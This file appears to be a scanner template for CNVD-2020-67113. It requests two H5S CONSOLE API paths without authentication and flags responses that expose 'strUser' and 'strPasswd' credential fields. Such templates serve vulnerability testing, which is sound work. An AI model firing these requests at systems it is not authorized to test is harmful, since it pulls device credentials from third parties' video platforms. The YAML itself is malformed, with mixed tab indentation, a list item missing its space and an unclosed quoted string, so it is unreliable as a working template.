id: h5s-video-platform-cnvd-2020-67113-unauth

info:
  name: H5S CONSOLE Unauthorized Access Vulnerability (CNVD-2020-67113)
  author: ritikchaddha
  severity: medium
  description: Zero Vision Technology (Shanghai) Co., Ltd. H5S CONSOLE Exists Unauthorized Access Vulnerability
  reference: https://vul.wangan.com/a/CNVD-2020-67113 
  tags: h5s,unauth,h5sconsole

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/GetSrc"
      - "{{BaseURL}}/api/v1/GetDevice"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'H5_AUTO'
          - 'strUser'
	  - 'strPasswd'
	  -'H5_DEV'
        part: body
        condition: and

      - type: word
        part: header
        words:
          - "json
        negative: true

      - type: status
        status:
          - 200
